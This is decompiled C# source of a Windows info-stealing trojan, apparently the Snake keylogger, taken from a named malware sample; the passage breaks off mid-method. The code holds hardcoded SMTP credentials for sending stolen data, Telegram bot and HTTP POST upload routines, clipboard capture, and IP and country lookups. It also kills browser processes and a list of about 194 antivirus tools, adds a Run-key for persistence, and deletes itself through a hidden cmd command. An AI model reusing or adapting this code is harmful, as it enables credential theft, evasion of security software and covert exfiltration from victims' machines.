// Decompiled with JetBrains decompiler
// Type: ҟzʤȨ뫆.Ɖӓ֏ɢ�
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-3faa06bbade229a8aa4255134ad2bb94b129e470fbfc5ff6863adf68bc0280b9.exe

using \u061DӺęсڿ;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Uٷأ嵱ٕ;
using ӤсjɩJ;

namespace ҟzʤȨ뫆
{
  [StandardModule]
  internal sealed class Ɖӓ\u058Fɢ\uFFFD
  {
    public static string \uFFFD\uFFFDşzÒ;
    public static string \uFFFDکܪ\uFFFD\uFFFD;
    public static string \uF0B9㹃\u058Fִ̔ = ".txt";
    private static Process[] 鈇\uFFFD\uFFFDãԹ = Process.GetProcesses();
    private static string ëӚ\u07B9\u003Bҏ;
    private static string \uFFFD꼺c̲\u0040;
    public static string Zʓɢ\uFFFD\uFFFD;
    private static string \u2964ēٚԹ\uFFFD;
    private static Ɖӓ\u058Fɢ\uFFFD.KeyLogger \uFFFDϒ\uFFFD̔ﾭ;
    private static StringBuilder Zٚ\u00AB\uFFFDę;
    private static object \u0332OZ\u0385꼺;
    private static object \uFFFD恁ԹľK;
    private static object \uFFFD\uFFFD\uFFFD盀䕃;
    private static string ΑԜ븤Αҡ;
    private static object \uFFFDс\u07B8KÒ;
    private static string \uFFFD盀ôׁܣ;
    private static string ا\u005Eڿ\u00BEŴ;
    private static string åųR䕃\u02F3;
    private static string ëУϒ㹃\uFFFD;
    private static string œˤʓϒ\u26CA;
    private static string \u0026ٕ\u0097\uFFFD\uFFFD;
    private static string œ\uFFFDi߂鈇;
    private static string \u07B8皍ٷ\uFFFD恁;
    private static string ĂɛUē\uFFFD;
    private static string 嵱꾯ē\u07BBأ;
    private static string \u05C1̳皍\u07B9ˤ;
    private static string \uFFFDЮӥ\u02F3\uFFFD;
    public static string \uFFFD\uFFFDﾭ\uFFFDی;
    private static object Ңۚ뜸븤꾯;

    static Ɖӓ\u058Fɢ\uFFFD()
    {
      Ɖӓ\u058Fɢ\uFFFD.ٷٗٵ츠ߡ = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.Cթ\u07FB콪ި = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.Αמϫ\uFFFD\uFFFD = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.å\u0609Ӛا\uFFFD = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.ӺƉƟבמ = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.ãWƌ̮̆ = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.Πٕ泮ӓ㠰 = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.m\uFFFDē̲У = new System.Windows.Forms.Timer();
      Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040 = "$%SMTPDV$";
      Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD = "";
      Ɖӓ\u058Fɢ\uFFFD.\u2964ēٚԹ\uFFFD = "$#TheHashHere%&";
      Ɖӓ\u058Fɢ\uFFFD.Zٚ\u00AB\uFFFDę = new StringBuilder();
      Ɖӓ\u058Fɢ\uFFFD.\u0332OZ\u0385꼺 = (object) "False";
      Ɖӓ\u058Fɢ\uFFFD.\uFFFD恁ԹľK = (object) "False";
      Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFD\uFFFD盀䕃 = (object) "False";
      Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ = "$ProtectPass%";
      Ɖӓ\u058Fɢ\uFFFD.\uFFFDс\u07B8KÒ = (object) "ProtectFalse";
      Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ = "False";
      Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object) "\r\nDate and Time: ", Ɖӓ\u058Fɢ\uFFFD.\u05C3\uFFFD\u02E8\uFFFD̮())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "\r\nClient IP: ", Ɖӓ\u058Fɢ\uFFFD.\u0657أƉ߂ܣ()), (object) "\r\n"), (object) "Country Name: "), Ɖӓ\u058Fɢ\uFFFD.ܪ2蠺ב\uF0B9()), (object) "\r\n")));
      Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3 = "wwci@williamwilscontractor.com";
      Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD = "Obisike123";
      Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA = "smtp.williamwilscontractor.com";
      Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD = "wwci@williamwilscontractor.com";
      Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇 = "587";
      Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁 = "";
      Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD = "";
      Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ = "";
      Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ = "";
      Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD = "";
      Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯 = (object) ("ZyiAEnXWZP" + new Random().Next().ToString());
    }

    public static System.Windows.Forms.Timer ٷٗٵ츠ߡ
    {
      get => Ɖӓ\u058Fɢ\uFFFD.ę\u0026թB\u0097;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.ӥɮ\uFFFDWܹ);
        System.Windows.Forms.Timer ęԹB1 = Ɖӓ\u058Fɢ\uFFFD.ę\u0026թB\u0097;
        if (ęԹB1 != null)
          ęԹB1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.ę\u0026թB\u0097 = value;
        System.Windows.Forms.Timer ęԹB2 = Ɖӓ\u058Fɢ\uFFFD.ę\u0026թB\u0097;
        if (ęԹB2 == null)
          return;
        ęԹB2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Cթ\u07FB콪ި
    {
      get => Ɖӓ\u058Fɢ\uFFFD.ߟ䇹Ł콪\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.蠺ٕē䇹Қ);
        System.Windows.Forms.Timer ߟ䇹Ł콪1 = Ɖӓ\u058Fɢ\uFFFD.ߟ䇹Ł콪\uFFFD;
        if (ߟ䇹Ł콪1 != null)
          ߟ䇹Ł콪1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.ߟ䇹Ł콪\uFFFD = value;
        System.Windows.Forms.Timer ߟ䇹Ł콪2 = Ɖӓ\u058Fɢ\uFFFD.ߟ䇹Ł콪\uFFFD;
        if (ߟ䇹Ł콪2 == null)
          return;
        ߟ䇹Ł콪2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Αמϫ\uFFFD\uFFFD
    {
      get => Ɖӓ\u058Fɢ\uFFFD.Ԝœ泮Cē;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.ϱmﾭ\uFFFDƌ);
        System.Windows.Forms.Timer ԝœ泮Cē1 = Ɖӓ\u058Fɢ\uFFFD.Ԝœ泮Cē;
        if (ԝœ泮Cē1 != null)
          ԝœ泮Cē1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.Ԝœ泮Cē = value;
        System.Windows.Forms.Timer ԝœ泮Cē2 = Ɖӓ\u058Fɢ\uFFFD.Ԝœ泮Cē;
        if (ԝœ泮Cē2 == null)
          return;
        ԝœ泮Cē2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer å\u0609Ӛا\uFFFD
    {
      get => Ɖӓ\u058Fɢ\uFFFD.j\u2964\uFFFD̀\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.U\uFFFDߟ\uFFFD\uFFFD);
        System.Windows.Forms.Timer j̀1 = Ɖӓ\u058Fɢ\uFFFD.j\u2964\uFFFD̀\uFFFD;
        if (j̀1 != null)
          j̀1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.j\u2964\uFFFD̀\uFFFD = value;
        System.Windows.Forms.Timer j̀2 = Ɖӓ\u058Fɢ\uFFFD.j\u2964\uFFFD̀\uFFFD;
        if (j̀2 == null)
          return;
        j̀2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("kLLTIm")]
    public static System.Windows.Forms.Timer ӺƉƟבמ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static System.Windows.Forms.Timer ãWƌ̮̆
    {
      get => Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u005E\u060Cş泮;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.뫆ֵ\uFFFDş\uFFFD);
        System.Windows.Forms.Timer ş泮1 = Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u005E\u060Cş泮;
        if (ş泮1 != null)
          ş泮1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u005E\u060Cş泮 = value;
        System.Windows.Forms.Timer ş泮2 = Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u005E\u060Cş泮;
        if (ş泮2 == null)
          return;
        ş泮2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Πٕ泮ӓ㠰
    {
      get => Ɖӓ\u058Fɢ\uFFFD.ӤӚ\uFFFD皍ӥ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uD997\uDDCBٚ꼺);
        System.Windows.Forms.Timer ӥӛ皍ӥ1 = Ɖӓ\u058Fɢ\uFFFD.ӤӚ\uFFFD皍ӥ;
        if (ӥӛ皍ӥ1 != null)
          ӥӛ皍ӥ1.Tick -= eventHandler;
        Ɖӓ\u058Fɢ\uFFFD.ӤӚ\uFFFD皍ӥ = value;
        System.Windows.Forms.Timer ӥӛ皍ӥ2 = Ɖӓ\u058Fɢ\uFFFD.ӤӚ\uFFFD皍ӥ;
        if (ӥӛ皍ӥ2 == null)
          return;
        ӥӛ皍ӥ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProHfutimer")]
    public static System.Windows.Forms.Timer m\uFFFDē̲У { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static void ŔR\uFFFDë\uFFFD()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ[index].ProcessName), "chrome", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void W\u0609퓜̀ۚ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ[index].ProcessName), "firefox", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        Ɖӓ\u058Fɢ\uFFFD.鈇\uFFFD\uFFFDãԹ[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void Қ蠺Α\u05C3ʭ()
    {
      string[] strArray1 = new string[194]
      {
        "zlclient",
        "egui",
        "bdagent",
        "npfmsg",
        "olydbg",
        "anubis",
        "wireshark",
        "avastui",
        "_Avp32",
        "vsmon",
        "mbam",
        "keyscrambler",
        "_Avpcc",
        "_Avpm",
        "Ackwin32",
        "Outpost",
        "Anti-Trojan",
        "ANTIVIR",
        "Apvxdwin",
        "ATRACK",
        "Autodown",
        "Avconsol",
        "Ave32",
        "Avgctrl",
        "Avkserv",
        "Avnt",
        "Avp",
        "Avp32",
        "Avpcc",
        "Avpdos32",
        "Avpm",
        "Avptc32",
        "Avpupd",
        "Avsched32",
        "AVSYNMGR",
        "Avwin95",
        "Avwupd32",
        "Blackd",
        "Blackice",
        "Cfiadmin",
        "Cfiaudit",
        "Cfinet",
        "Cfinet32",
        "Claw95",
        "Claw95cf",
        "Cleaner",
        "Cleaner3",
        "Defwatch",
        "Dvp95",
        "Dvp95_0",
        "Ecengine",
        "Esafe",
        "Espwatch",
        "F-Agnt95",
        "Findviru",
        "Fprot",
        "F-Prot",
        "F-Prot95",
        "Fp-Win",
        "Frw",
        "F-Stopw",
        "Iamapp",
        "Iamserv",
        "Ibmasn",
        "Ibmavsp",
        "Icload95",
        "Icloadnt",
        "Icmon",
        "Icsupp95",
        "Icsuppnt",
        "Iface",
        "Iomon98",
        "Jedi",
        "Lockdown2000",
        "Lookout",
        "Luall",
        "MCAFEE",
        "Moolive",
        "Mpftray",
        "N32scanw",
        "NAVAPSVC",
        "NAVAPW32",
        "NAVLU32",
        "Navnt",
        "NAVRUNR",
        "Navw32",
        "Navwnt",
        "NeoWatch",
        "NISSERV",
        "Nisum",
        "Nmain",
        "Normist",
        "NORTON",
        "Nupgrade",
        "Nvc95",
        "Outpost",
        "Padmin",
        "Pavcl",
        "Pavsched",
        "Pavw",
        "PCCIOMON",
        "PCCMAIN",
        "Pccwin98",
        "Pcfwallicon",
        "Persfw",
        "POP3TRAP",
        "PVIEW95",
        "Rav7",
        "Rav7win",
        "Rescue",
        "Safeweb",
        "Scan32",
        "Scan95",
        "Scanpm",
        "Scrscan",
        "Serv95",
        "Smc",
        "SMCSERVICE",
        "Snort",
        "Sphinx",
        "Sweep95",
        "SYMPROXYSVC",
        "Tbscan",
        "Tca",
        "Tds2-98",
        "Tds2-Nt",
        "TermiNET",
        "Vet95",
        "Vettray",
        "Vscan40",
        "Vsecomr",
        "Vshwin32",
        "Vsstat",
        "Webscanx",
        "WEBTRAP",
        "Wfindv32",
        "Zonealarm",
        "LOCKDOWN2000",
        "RESCUE32",
        "LUCOMSERVER",
        "avgcc",
        "avgcc",
        "avgamsvr",
        "avgupsvc",
        "avgw",
        "avgcc32",
        "avgserv",
        "avgserv9",
        "avgserv9schedapp",
        "avgemc",
        "ashwebsv",
        "ashdisp",
        "ashmaisv",
        "ashserv",
        "aswUpdSv",
        "symwsc",
        "norton",
        "Norton Auto-Protect",
        "norton_av",
        "nortonav",
        "ccsetmgr",
        "ccevtmgr",
        "avadmin",
        "avcenter",
        "avgnt",
        "avguard",
        "avnotify",
        "avscan",
        "guardgui",
        "nod32krn",
        "nod32kui",
        "clamscan",
        "clamTray",
        "clamWin",
        "freshclam",
        "oladdin",
        "sigtool",
        "w9xpopen",
        "Wclose",
        "cmgrdian",
        "alogserv",
        "mcshield",
        "vshwin32",
        "avconsol",
        "vsstat",
        "avsynmgr",
        "avcmd",
        "avconfig",
        "licmgr",
        "sched",
        "preupd",
        "MsMpEng",
        "MSASCui",
        "Avira.Systray"
      };
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string Right = strArray2[index2];
          if (Operators.CompareString(process.ProcessName, Right, false) == 0)
          {
            process.Kill();
            break;
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public static object \uFFFDtz\uFFFD䕃(string ᔖޤҚԜę)
    {
      if (Process.GetProcessesByName(ᔖޤҚԜę).Length > 0)
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static object ٷľڿٵс(string C꼺Rأ泮)
    {
      if (System.IO.File.Exists(C꼺Rأ泮))
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static string \uFFFD\uFFFDϱܹ꾯(string _param0)
    {
      SHA256 shA256 = SHA256.Create();
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      inputStream.Position = 0L;
      byte[] hash = shA256.ComputeHash((Stream) inputStream);
      inputStream.Close();
      string str = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        str += hash[index].ToString("X2");
        checked { ++index; }
      }
      return str.ToLower();
    }

    public static void \u0331ӛ皍ŚŴ()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uDAAE\uDDB5츠\uFFFDŔ(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int Ł̀븤Ѕױ(uint _param0);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ݝӓԜmŔ([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long ΠCᔖtɇ);

    public static void ζӚ̧Śс()
    {
    }

    public static void ŧ2\uFFFDҭל(string _param0, string _param1)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(_param0, (object) _param1, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \u07A8k̮\uFFFDҡ(
      string _param0,
      string _param1,
      string åܪҡִ2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(åܪҡִ2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void i\uFFFD\uFFFDٷ̀(
      string _param0,
      string _param1,
      string 皍̆늻kꓞ,
      string WٕRٷЅ)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = WٕRٷЅ;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(皍̆늻kꓞ, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ܣ\uFFFDӚջɮ(string ב꼺mﾭۨ, string ôJē䇹ɛ, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) ב꼺mﾭۨ, (object) ôJē䇹ɛ, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \uFFFD泮ڿۣ\uFFFD(
      byte[] _param0,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(_param0);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param1, (object) _param2, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param3, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05C1ɢߟęҢ(string _param0, string _param1, string _param2)
    {
      try
      {
        string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        string empty = string.Empty;
        try
        {
          using (Stream responseStream = httpWebRequest.GetResponse().GetResponseStream())
            new StreamReader(responseStream, Encoding.UTF8).ReadToEnd();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          WebException webException = ex;
          empty = webException.Message.ToString();
          using (Stream responseStream = webException.Response.GetResponseStream())
            new StreamReader(responseStream, Encoding.GetEncoding("utf-8")).ReadToEnd();
          throw;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string Уӛʭήã(string _param0, string _param1)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] destinationArray = new byte[8];
      Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(_param1)), 0, (Array) destinationArray, 0, 8);
      cryptoServiceProvider1.Key = destinationArray;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(_param0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static object \u032EcK恁\u0097()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) (Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0)))) + " GB");
    }

    public static object \u05C3\uFFFD\u02E8\uFFFD̮() => (object) (Conversions.ToString(DateAndTime.Today) + " / " + Conversions.ToString(DateAndTime.TimeOfDay));

    public static object ƚ\uFFFD븤\uFFFD퓜() => (object) \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Info.OSFullName;

    public static object Śϱ\uFFFD恁ٷ() => (object) \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Info.OSVersion;

    public static object Ă䇹ݶՄҟ() => (object) string.Format("{0:f2} GB", (object) ((double) \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Info.TotalPhysicalMemory / 1073741824.0));

    public static object \u0657أƉ߂ܣ()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
      string address = "http://checkip.dyndns.org/";
      IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
      systemWebProxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
      webClient.Proxy = systemWebProxy;
      Stream stream;
      try
      {
        stream = webClient.OpenRead(address);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
    }

    public static object ܪ2蠺ב\uF0B9()
    {
      XmlDocument Instance = new XmlDocument();
      object obj = Operators.AddObject((object) "https://freegeoip.app/xml/", Ɖӓ\u058Fɢ\uFFFD.\u0657أƉ߂ܣ());
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "Load", objArray = new object[1]
      {
        obj
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
      {
        true
      }, true);
      if (flagArray[0])
        RuntimeHelpers.GetObjectValue(objArray[0]);
      XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
      string str = "";
      try
      {
        foreach (XmlElement xmlElement in elementsByTagName)
          str = xmlElement.InnerText;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return (object) str;
    }

    public static byte[] εŲ\uFFFDãã() => Encoding.Unicode.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n\r\n\r\n" + Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD + "\r\n\r\n--------------------------------------------------");

    public static void ϱmﾭ\uFFFDƌ(object _param0, EventArgs _param1)
    {
      if (Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD.ToString().Contains(\u0385cOŚ㠰.\u00ABіבՄ\u07B4.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>")))
        return;
      Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD = Ɖӓ\u058Fɢ\uFFFD.Zʓɢ\uFFFD\uFFFD + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>") + "\r\n";
    }

    public static void U\uFFFDߟ\uFFFD\uFFFD(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
